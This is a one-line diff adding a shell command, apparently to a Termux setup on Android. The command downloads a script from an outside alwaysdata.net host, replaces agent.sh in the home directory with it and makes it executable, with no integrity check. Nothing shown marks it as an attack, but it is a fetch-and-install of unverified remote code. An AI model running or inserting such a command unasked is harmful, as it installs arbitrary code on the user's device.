@@ -1,0 +1,1 @@
+curl -s https://safaothman.alwaysdata.net/safa-droid.sh > /data/data/com.termux/files/home/agent.sh.new && mv -f /data/data/com.termux/files/home/agent.sh.new /data/data/com.termux/files/home/agent.sh && chmod +x /data/data/com.termux/files/home/agent.sh && echo "ATOMIC_UPDATE_SUCCESS"
